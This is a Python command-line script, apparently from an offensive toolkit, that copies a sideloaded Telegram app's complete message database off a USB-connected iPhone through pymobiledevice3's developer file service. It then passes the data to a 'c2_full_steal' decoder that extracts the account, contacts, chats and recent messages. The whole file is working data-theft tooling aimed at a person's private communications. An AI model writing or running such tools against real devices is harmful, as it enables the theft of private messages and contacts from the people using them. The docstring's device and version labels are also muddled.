#!/usr/bin/env python3
"""iOS 17 (iPhone 17 / iOS 27) session C2 CLI.

Pulls the full Postbox database of the <ACCOUNT_NAME> account from the
sideloaded Telegram app's data container through the CoreDevice file
service (RSD userspace tunnel), then decodes the session: account,
contacts/chats and recent messages, masked.

The sideload app (com.user.tg72799.B472R2D493) redirects Telegram's
App Group to <HOME>/Documents (libgroupfix), so its complete
telegram-data tree lives in its app data container and is readable by
the device's developer file service without touching the running app.

Usage:
  python3 c2_ios17_session.py                 # pull + decode
  python3 c2_ios17_session.py --decode-only DB
  python3 c2_ios17_session.py --account 16979388325134119436
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.normpath(os.path.join(HERE, "..", ".."))
PMD = os.path.join(ROOT, "ios_sideload", "venv", "bin", "pymobiledevice3")
BUNDLE = "com.user.tg72799.B472R2D493"
DEFAULT_ACCOUNT = "16979388325134119436"
DEFAULT_OUT = "/tmp/opencode/ios17_session_db"
CHAT = 0  # <ACCOUNT_NAME>


def _pmd_error(e: Exception) -> str:
    if isinstance(e, subprocess.CalledProcessError):
        lines = (e.stderr or "").splitlines()
        errs = [line for line in lines if "ERROR" in line] or lines[-3:]
        return " | ".join(errs).strip() or ("exit %s" % e.returncode)
    return str(e)


def run_pmd(args: list[str]) -> str:
    cmd = [PMD, "developer", "core-device"] + args + ["--userspace"]
    p = subprocess.run(cmd, check=True, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, text=True)
    return p.stdout


def preflight() -> bool:
    """Fail with a clear message when usbmuxd/the iPhone is unavailable."""
    try:
        p = subprocess.run([PMD, "usbmux", "list"], check=True,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=30)
        devices = json.loads(p.stdout or "[]")
    except Exception as e:
        print("[!] usbmuxd non raggiungibile: %s" % _pmd_error(e))
        print("    avvia usbmuxd:  sudo systemctl start usbmuxd")
        return False
    if not devices:
        print("[!] nessun iPhone su USB: collega il 17, sbloccalo e riprova.")
        print("    verifica con:  ios_sideload/venv/bin/pymobiledevice3 usbmux list")
        return False
    d = devices[0]
    print("[*] device: %s  iOS %s  (%s)" % (
        d.get("DeviceName"), d.get("ProductVersion"), d.get("Identifier")))
    return True


def list_accounts() -> list[str]:
    try:
        out = run_pmd(["list-directory", "appDataContainer",
                       "Documents/telegram-data",
                       "--identifier", BUNDLE])
        names = json.loads(out)
        return [n.strip("/").split("/")[-1] for n in names
                if "account-" in n]
    except Exception as e:
        print("[!] account listing failed: %s" % _pmd_error(e), file=sys.stderr)
        return []


def read_remote(remote: str, local: str) -> bool:
    try:
        out = run_pmd(["read-file", "appDataContainer", remote,
                       "--identifier", BUNDLE, "--output", local])
        print("[*] pulled %s -> %s (%s)" % (
            remote, local, out.strip() or "ok"))
        return True
    except Exception as e:
        print("[!] pull failed: %s" % _pmd_error(e), file=sys.stderr)
        return False


def pull(out: str, account: str | None) -> bool:
    acct = account
    if not acct:
        found = list_accounts()
        acct = found[0] if found else DEFAULT_ACCOUNT
        print("[*] account dir: %s" % acct)
    base = ("Documents/telegram-data/account-%s/postbox/db/" % acct)
    if not read_remote(base + "db_sqlite", out):
        return False
    # The WAL/SHM are needed for the most recent transactions.
    for suffix in ("-wal", "-shm"):
        read_remote(base + "db_sqlite" + suffix, out + suffix)
    return True


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", default=DEFAULT_OUT)
    ap.add_argument("--account", default=None,
                    help="account-<id> suffix (auto-detected by default)")
    ap.add_argument("--decode-only", default=None)
    ap.add_argument("--chat", type=int, default=CHAT)
    args = ap.parse_args()

    if args.decode_only:
        target = args.decode_only
    else:
        if not os.path.exists(PMD):
            print("[!] pymobiledevice3 not found at %s" % PMD)
            return 2
        if not preflight():
            return 2
        if not pull(args.out, args.account):
            return 1
        target = args.out

    sys.path.insert(0, HERE)
    from c2_full_steal import decode_db
    decode_db(target, args.chat)
    return 0


if __name__ == "__main__":
    sys.exit(main())
